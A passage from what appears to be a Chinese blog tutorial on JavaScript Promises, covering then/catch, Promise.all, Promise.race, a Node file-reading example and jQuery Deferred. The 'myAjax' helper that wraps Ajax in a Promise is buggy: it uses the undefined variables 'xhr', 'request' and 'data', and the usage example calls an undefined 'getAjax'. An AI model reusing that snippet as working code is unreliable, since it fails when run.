对象添加回调函数，也会立即得到这个结果。这与事件（Event）完全不同，事件的特点是，如果你错过了它，再去监听，是得不到结果的。</p><h3 id="promise优缺点"><a href="#promise优缺点" class="headerlink" title="promise优缺点"></a>promise优缺点</h3><p>有了 Promise 对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。此外，Promise 对象提供统一的接口，使得控制异步操作更加容易。</p><p>Promise 也有一些缺点。首先，无法取消 Promise，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部。第三，当处于 Pending 状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）</p><h3 id="promise创建"><a href="#promise创建" class="headerlink" title="promise创建"></a>promise创建</h3><p>要想创建一个 promise 对象、可以使用 new 来调用 Promise 的构造器来进行实例化。</p><p>下面是创建 promise 的步骤：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 异步处理</span></span><br><span class="line">    <span class="comment">// 处理结束后、调用resolve 或 reject</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Promise 构造函数包含一个参数和一个带有 resolve（解析）和 reject（拒绝）两个参数的回调。在回调中执行一些操作（例如异步），如果一切都正常，则调用 resolve，否则调用 reject。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myFirstPromise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//当异步代码执行成功时，我们才会调用resolve(...), 当异步代码失败时就会调用reject(...)</span></span><br><span class="line">    <span class="comment">//在本例中，我们使用setTimeout(...)来模拟异步代码，实际编码时可能是XHR请求或是HTML5的一些API方法.</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        resolve(<span class="string">&quot;成功!&quot;</span>); <span class="comment">//代码正常执行！</span></span><br><span class="line">    &#125;, <span class="number">250</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">myFirstPromise.then(<span class="function"><span class="keyword">function</span>(<span class="params">successMessage</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//successMessage的值是上面调用resolve(...)方法传入的值.</span></span><br><span class="line">    <span class="comment">//successMessage参数不一定非要是字符串类型，这里只是举个例子</span></span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;Yay! &quot;</span> + successMessage);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>对于已经实例化过的 promise 对象可以调用 promise.then() 方法，传递 resolve 和 reject 方法作为回调。</p><p>promise.then() 是 promise 最为常用的方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">promise.then(onFulfilled, onRejected)</span><br></pre></td></tr></table></figure><p>promise简化了对error的处理，上面的代码我们也可以这样写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">promise.then(onFulfilled).catch(onRejected)</span><br></pre></td></tr></table></figure><p>下面是一个用 Promise 对象实现的 Ajax 操作的例子。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">URL</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest(); </span><br><span class="line">        req.open(<span class="string">&#x27;GET&#x27;</span>, URL, <span class="literal">true</span>);</span><br><span class="line">        req.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.status === <span class="number">200</span>) &#123; </span><br><span class="line">                resolve(req.responseText);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                reject(<span class="keyword">new</span> <span class="built_in">Error</span>(req.statusText));</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;;</span><br><span class="line">        req.onerror = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            reject(<span class="keyword">new</span> <span class="built_in">Error</span>(req.statusText));</span><br><span class="line">        &#125;;</span><br><span class="line">        req.send(); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> URL = <span class="string">&quot;/try/ajax/testpromise.php&quot;</span>; </span><br><span class="line">ajax(URL).then(<span class="function"><span class="keyword">function</span> <span class="title">onFulfilled</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;内容是：&#x27;</span> + value); </span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span> <span class="title">onRejected</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;错误：&#x27;</span> + error); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>catch是捕捉错误</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">&quot;/posts.json&quot;</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">posts</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 处理前一个回调函数运行时发生的错误</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;发生错误！&#x27;</span>, error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Promise.all 方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">Promise</span>.all([p1,p2,p3]);</span><br></pre></td></tr></table></figure><p>上面代码中，Promise.all 方法接受一个数组作为参数，p1、p2、p3 都是 Promise 对象的实例。（Promise.all 方法的参数不一定是数组，但是必须具有 iterator 接口，且返回的每个成员都是 Promise 实例。）</p><p>p 的状态由 p1、p2、p3 决定，分成两种情况。</p><ul><li>（1）只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。</li><li>（2）只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。</li></ul><p>下面是一个具体的例子。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成一个Promise对象的数组</span></span><br><span class="line"><span class="keyword">var</span> promises = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>].map(<span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(<span class="string">&quot;/post/&quot;</span> + id + <span class="string">&quot;.json&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">Promise</span>.all(promises).then(<span class="function"><span class="keyword">function</span>(<span class="params">posts</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...  </span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Promise.race 方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">Promise</span>.race([p1,p2,p3]);</span><br></pre></td></tr></table></figure><p>上面代码中，只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的Promise实例的返回值，就传递给p的返回值。</p><p>如果Promise.all方法和Promise.race方法的参数，不是Promise实例，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。</p><p><img src="https://s2.loli.net/2022/01/07/FsDvZxtCUm4zd6S.png" alt="image-20220107093016160"></p><p><img src="https://s2.loli.net/2022/01/07/p48mojYLPWqHexw.png" alt="image-20220107095921251"></p><p>return 字符时</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> p1=<span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    fs.readFile(<span class="string">&#x27;F:\\nodejs\\code\\a.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">            <span class="comment">//pending变成rejected</span></span><br><span class="line">            reject(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">            <span class="comment">//resolve实际上就是then方法传递的那个function</span></span><br><span class="line">            resolve(data)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p2=<span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    fs.readFile(<span class="string">&#x27;F:\\nodejs\\code\\b.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">            <span class="comment">//pending变成rejected</span></span><br><span class="line">            reject(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">            <span class="comment">//resolve实际上就是then方法传递的那个function</span></span><br><span class="line">            resolve(data)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">p1.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;7&quot;</span>)</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">爱你</span><br><span class="line"><span class="number">123</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><p>当return一个promise对象时，then的第一个参数是p2的resolve</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> p1=<span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    fs.readFile(<span class="string">&#x27;F:\\nodejs\\code\\a.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">            <span class="comment">//pending变成rejected</span></span><br><span class="line">            reject(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">            <span class="comment">//resolve实际上就是then方法传递的那个function</span></span><br><span class="line">            resolve(data)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p2=<span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    fs.readFile(<span class="string">&#x27;F:\\nodejs\\code\\b.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">            <span class="comment">//pending变成rejected</span></span><br><span class="line">            reject(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">            <span class="comment">//resolve实际上就是then方法传递的那个function</span></span><br><span class="line">            resolve(data)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">p1.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">    <span class="keyword">return</span> p2</span><br><span class="line"></span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;7&quot;</span>)</span><br><span class="line"></span><br><span class="line">结果:</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用promise模拟jquery中ajax"><a href="#使用promise模拟jquery中ajax" class="headerlink" title="使用promise模拟jquery中ajax"></a>使用promise模拟jquery中ajax</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myAjax</span>(<span class="params">type,url,params</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolved,rejected</span>)=&gt;</span>&#123;</span><br><span class="line">            <span class="comment">//创建ajax对象</span></span><br><span class="line">            <span class="keyword">let</span> ajax;</span><br><span class="line">            <span class="comment">//注意，不要根据浏览器的navigator.userAgent来检测浏览器是否支持某个JavaScript特性，一是因为这个字符串本身可以伪造，二是通过IE版本判断JavaScript特性将非常复杂。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">                ajax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ajax = <span class="keyword">new</span> ActiveXObject(<span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(type == <span class="string">&#x27;get&#x27;</span> || type == <span class="string">&#x27;&#x27;</span>)&#123;<span class="comment">//get</span></span><br><span class="line">                <span class="comment">//配置参数</span></span><br><span class="line">                ajax.open(<span class="string">&#x27;get&#x27;</span>,url,<span class="literal">true</span>)</span><br><span class="line">                <span class="comment">//发送请求</span></span><br><span class="line">                ajax.send();</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="string">&#x27;post&#x27;</span>)&#123;<span class="comment">//post</span></span><br><span class="line">                <span class="comment">//配置参数</span></span><br><span class="line">                ajax.open(<span class="string">&#x27;post&#x27;</span>,url,<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">//设置请求头，表示我传递的参数的类型</span></span><br><span class="line">                xhr.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">                <span class="comment">//发送请求，并将数据传递过去</span></span><br><span class="line">                ajax.send(<span class="built_in">JSON</span>.stringify(data));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//请求成功之后</span></span><br><span class="line">            request.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (request.readyState === <span class="number">4</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">this</span>.status === <span class="number">200</span>)&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(ajax.responseText)</span><br><span class="line">                        resolved(ajax.responseText);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        rejected();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getAjax(<span class="string">&#x27;get&#x27;</span>).then().catch()</span><br><span class="line">getAjax(<span class="string">&#x27;post&#x27;</span>,param).then().catch()</span><br></pre></td></tr></table></figure><h3 id="jQuery中的promise"><a href="#jQuery中的promise" class="headerlink" title="jQuery中的promise"></a>jQuery中的promise</h3><p>jQuery中deferred对象相当于promise</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> defer = $.Deferred();</span><br><span class="line">    <span class="built_in">console</span>.log(defer);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/07/LVWZAeEPQIi5aTN.png" alt="img"></p><p>用法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runAsync</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> defer = $.Deferred();</span><br><span class="line">        <span class="comment">//做一些异步操作</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;执行完成&#x27;</span>);</span><br><span class="line">            defer.resolve(<span class="string">&#x27;异步请求成功之后返回的数据&#x27;</span>);</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">return</span> defer;</span><br><span class="line">    &#125;</span><br><span class="line">    runAsync().then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ES6中的promise</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runAsync</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">           </span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&#x27;执行完成&#x27;</span>);</span><br><span class="line">                resolve(<span class="string">&#x27;异步请求成功之后返回的数据&#x27;</span>);</span><br><span class="line">            &#125;, <span class="number">1000</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> p;            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    runAsync().then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>先前了解了ES6的Promise对象，来看看jQuery中的Promise，也就是jQuery的Deferred对象。</p><p>打开浏览器的控制台先。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var defer = $.Deferred();</span><br><span class="line">    console.log(defer);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>运行代码</p><p>运行结果：</p><p><img src="https://images2017.cnblogs.com/blog/1235070/201709/1235070-20170928180504200-1631748545.png" alt="img"></p><p>和ES6的Promise对象长的有点像，jQuery的Deferred对象也有resolve、reject、then方法，还有done、fail、always……方法。jQuery就是用这个Deferred对象来注册异步操作的回调函数，修改并传递异步操作的状态。</p><p>玩玩Deferred：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function runAsync()&#123;</span><br><span class="line">        var defer = $.Deferred();</span><br><span class="line">        //做一些异步操作</span><br><span class="line">        setTimeout(function()&#123;</span><br><span class="line">            console.log(&#x27;执行完成&#x27;);</span><br><span class="line">            defer.resolve(&#x27;异步请求成功之后返回的数据&#x27;);</span><br><span class="line">        &#125;, 1000);</span><br><span class="line">        return defer;</span><br><span class="line">    &#125;</span><br><span class="line">    runAsync().then(function(data)&#123;</span><br><span class="line">        console.log(data)</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>运行代码</p><p> 运行之后，Deferred对象的实例defer通过resolve方法把参数 “异步请求成功之后返回的数据” 传回到then方法中进行接收，，打印。</p><p>和ES6的Promise相似，但是有一点点区别，再看下Promise：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function runAsync()&#123;</span><br><span class="line">        var p = new Promise(function(resolve, reject)&#123;</span><br><span class="line">           </span><br><span class="line">            setTimeout(function()&#123;</span><br><span class="line">                console.log(&#x27;执行完成&#x27;);</span><br><span class="line">                resolve(&#x27;异步请求成功之后返回的数据&#x27;);</span><br><span class="line">            &#125;, 1000);</span><br><span class="line">        &#125;);</span><br><span class="line">        return 